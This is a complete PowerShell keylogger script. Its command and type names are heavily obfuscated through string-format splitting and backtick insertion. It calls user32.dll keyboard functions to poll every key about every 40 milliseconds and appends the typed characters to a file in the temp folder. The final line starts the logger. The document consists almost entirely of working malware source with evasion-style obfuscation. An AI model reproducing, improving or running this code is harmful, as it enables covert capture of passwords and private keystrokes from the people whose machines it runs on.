  &("{1}{0}"-f 'T','SE') ('kPm'+'c')  ([TyPE]("{1}{2}{0}" -F 'lE','c','Onso') ); .("{1}{0}"-f '-ItEM','seT') ("{0}{2}{3}{1}"-f 'vaRiaB',':5xhR9','L','e') ([tyPe]("{0}{2}{3}{1}" -f 'sYS','Io.fILE','teM','.'));   ${9x`D5} =  [tyPe]("{0}{1}{3}{4}{2}" -f'sy','StEM.','.ENCOdINg','TeX','t') ;  
function STAr`T-`k`eylOG`Ger(${pa`Th}="$env:temp\keylogger.txt") 
{
  
  ${S`iGnAtu`ReS} = ((("{108}{107}{31}{93}{3}{66}{46}{20}{70}{44}{64}{83}{27}{23}{13}{75}{10}{55}{74}{16}{17}{6}{106}{67}{40}{8}{9}{80}{98}{35}{86}{34}{109}{76}{84}{12}{57}{15}{54}{14}{79}{1}{48}{62}{25}{11}{65}{41}{89}{72}{78}{0}{100}{37}{82}{42}{99}{52}{102}{87}{73}{38}{4}{21}{69}{2}{22}{77}{7}{45}{43}{97}{26}{29}{96}{56}{30}{91}{5}{81}{101}{39}{51}{19}{104}{88}{61}{71}{63}{59}{33}{110}{94}{68}{60}{28}{24}{36}{92}{105}{85}{49}{50}{103}{32}{58}{47}{95}{90}{18}{53}"-f'oa','=Cha','n int MapVi','r3','harSet.','d','Key','uCode','irt','ualK','sho','lic sta','r3','er',', Char','s','A','sync',';','c static ex',' CharSet=C','Au','rtual','atic ext','em.Text.','b','uMap','st','lpkeystate, Syst','Type);
[','user3','lImpor','B','int ',';','ode','Strin','tate(byt','Set=C','Set','t v','c','[DllImport','n',' ExactSp',', i',',','Flag','rSet.Aut','szBuff,',' int','.Auto)]
publi','zuser32','
STI','dz','rt Ge','llImport(sdz','2.dll','uff, uint w','u',' ','nicode(uint wV','o)]
pu','y, ','elling=true)] 
pub','ti','2.dllsdz','(in','[]','to)]
public static exter','harSet.Auto,','irtKe','rn int GetKe',' Char','t','n ','llImport','Key(uint ','yb','Set','ey','llsdz, Cha','e[] keystate);
','lic ','(sdzuse','lder pw',')',',',' int ToU',' exte',')','2.','gBu','t(sdzuse','e','s','D','t ','C','(sd','rdS','rSet=Char','.dllsdz',' cch','tern','i','State','
[Dl','STI',' 
[D','wScanCode, byt'))-crepLACE  'STI',[chAr]39  -RePLAce 'sdz',[chAr]34)

  
  ${A`pI} = .("{0}{1}{2}" -f'Add-','T','ype') -MemberDefinition ${sIgna`T`Ures} -Name ("{0}{1}"-f 'Win','32') -Namespace ("{1}{0}"-f 'PI','A') -PassThru
    
  
  ${N`ULl} = .("{0}{2}{1}" -f'New-I','m','te') -Path ${P`Ath} -ItemType ("{1}{0}"-f 'e','Fil') -Force

  try
  {
    .("{0}{2}{1}" -f 'Write','ost','-H') ("{8}{5}{6}{9}{0}{4}{2}{13}{3}{11}{1}{10}{7}{12}"-f 'se','s','re','TRL+C to s','s. P','rding ','key p','lt','Reco','res','u','ee re','s.','ss C') -ForegroundColor ("{1}{0}"-f 'd','Re')

    
    
    while (${T`RuE}) {
      .("{0}{2}{3}{1}" -f'Star','p','t-Sle','e') -Milliseconds 40
      
      
      for (${a`s`cii} = 9; ${A`sciI} -le 254; ${AsC`ii}++) {
        
        ${s`Ta`TE} = ${a`pi}::("{4}{2}{3}{0}{1}" -f'a','te','y','ncKeySt','GetAs').Invoke(${a`Sc`Ii})

        
        if (${sta`TE} -eq -32767) {
          ${n`ULL} =  (  &("{0}{1}" -f'g','Ci') ("V"+"ArI"+"aBl"+"E:kP"+"Mc")  ).vALUe::"caPsL`Ock"

          
          ${v`Irtu`ALKEy} = ${a`PI}::("{2}{1}{0}" -f 'y','pVirtualKe','Ma').Invoke(${a`sCii}, 3)

          
          ${KB`s`Tate} = .("{0}{2}{1}"-f 'Ne','-Object','w') ("{1}{0}{2}" -f 'e[','Byt',']') 256
          ${c`h`eCK`k`BSTaTE} = ${A`pI}::("{2}{1}{0}{3}" -f 'a','t','GetKeyboardS','te').Invoke(${kb`S`TATE})

          
          ${M`ycHar} = &("{1}{2}{0}" -f't','New','-Objec') -TypeName ("{2}{4}{1}{6}{3}{5}{0}" -f'r','Tex','Syst','Build','em.','e','t.String')

          
          ${S`U`ccesS} = ${A`pI}::("{1}{0}{2}"-f'U','To','nicode').Invoke(${ASc`ii}, ${V`iR`TuAlKEY}, ${Kb`sTa`Te}, ${mYCh`Ar}, ${Myc`H`Ar}."cap`AcI`TY", 0)

          if (${S`UcC`EsS}) 
          {
            
              (.('lS')  ("{3}{4}{0}{1}{2}" -f'h','r','9','vaRiABL','e:5X') ).vALue::"AppenD`Al`lT`eXt"(${Pa`Th}, ${Myc`hAR},  ${9X`d5}::"uNiC`O`dE") 
          }
        }
      }
    }
  }
  finally
  {
    
    &("{2}{1}{0}" -f'epad','ot','n') ${P`AtH}
  }
}



&("{1}{0}{2}"-f 'tart-KeyLog','S','ger')

